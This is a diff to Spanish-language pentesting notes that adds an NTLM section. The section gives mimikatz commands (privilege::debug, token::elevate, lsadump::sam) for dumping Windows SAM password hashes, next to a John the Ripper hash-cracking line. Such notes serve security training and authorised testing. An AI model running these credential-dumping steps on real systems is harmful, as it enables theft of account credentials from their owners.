@@ -58,3 +58,23 @@
   Y corremos JTR:
 
     └─# john --wordlist=ssh.passwords --rules=sshRules ssh_hash
+
+### NTLM
+
+  Si tenemos privilegios de Administador en una máquina Windows, ejecutamos el comando para ver otros usuarios en el sistema a través de PowerShell:
+
+    Get-LocalUser
+
+  Una vez localicemos los nuevos usuarios, corremos mimikatz y ejecutamos:
+
+    privilege::debug
+
+  Con este comando activamos el permiso 'SeDebugPrivilege' que es necesario para este ataque. Después, lanzamos:
+
+    token::elevate
+
+  Para elevar privilegios a SISTEMA.
+
+  Finalmente, para obtener los hashes:
+
+    lsadump::sam
